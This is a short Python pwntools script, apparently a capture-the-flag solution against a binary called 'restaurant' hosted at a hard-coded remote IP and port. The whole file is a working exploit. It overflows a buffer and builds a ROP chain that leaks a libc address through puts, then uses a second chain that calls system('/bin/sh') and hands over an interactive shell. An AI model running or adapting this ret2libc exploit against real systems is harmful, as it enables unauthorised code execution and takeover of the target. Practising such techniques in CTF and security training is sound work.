
from pwn import *

elf = ELF('./restaurant', checksec=False)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# r = process(elf.path)
r = remote('138.68.182.108', 31385)

pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
ret = rop.find_gadget(['ret'])[0]
elf_plt = elf.plt['puts']
elf_got = elf.got['puts']
main = elf.sym['main']
puts_off = libc.sym['puts']

r.recvuntil(b'> ')
r.sendline(b'1')

r.recvuntil(b'> ')

p = cyclic(40)
p += p64(pop_rdi)
p += p64(elf_got)
p += p64(elf_plt)
p += p64(main)

r.sendline(p)
LIBC = int.from_bytes(r.recvuntil(b'> ').split()[3][-6:], byteorder='little') - puts_off

sleep(3)

BINSH = next(libc.search(b"/bin/sh")) + LIBC
SYSTEM = libc.sym["system"] + LIBC

r.sendline(b'1')

r.recvuntil(b'> ')

p = cyclic(40)
p += p64(ret)
p += p64(pop_rdi)
p += p64(BINSH)
p += p64(SYSTEM)

r.sendline(p)

r.interactive()
